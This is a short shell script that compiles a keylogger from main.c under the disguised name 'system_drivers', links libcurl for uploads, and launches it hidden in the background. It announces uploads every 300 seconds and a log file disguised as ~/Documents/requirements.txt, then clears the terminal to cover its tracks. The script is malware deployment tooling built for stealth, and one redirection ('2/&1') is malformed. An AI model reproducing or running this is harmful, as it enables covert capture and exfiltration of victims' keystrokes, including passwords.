#!/bin/sh
echo "[*] Checking dependencies..."
if ! command -v gcc >/dev/null 2>&1; then
    echo "[!] Error: gcc is not installed."
    exit 1
fi

if [ ! -f "main.c" ]; then
    echo "[!] Error: main.c not found in current directory."
    exit 1
fi

echo "[*] Compiling main.c..."
gcc -o system_drivers main.c -lcurl -lX11 -Wall -Wno-stringop-truncation -Wno-format-truncation 2>&1
COMPILE_STATUS=$?

if [ $COMPILE_STATUS -ne 0 ]; then
    echo "[!] Compilation failed."
    exit 1
fi

echo "[*] Compilation successful. Starting keylogger..."
nohup ./system_drivers > /dev/null 2/&1 &
ECHO_PID=$!
echo "[+] Keylogger started as background process (PID: $ECHO_PID)"
echo "[*] Uploads every 300s. Check ~/Documents/requirements.txt"
echo "[*] Stop with: pkill -f system_drivers"
echo "[*] Clearing terminal in 10s"
sleep 10
clear
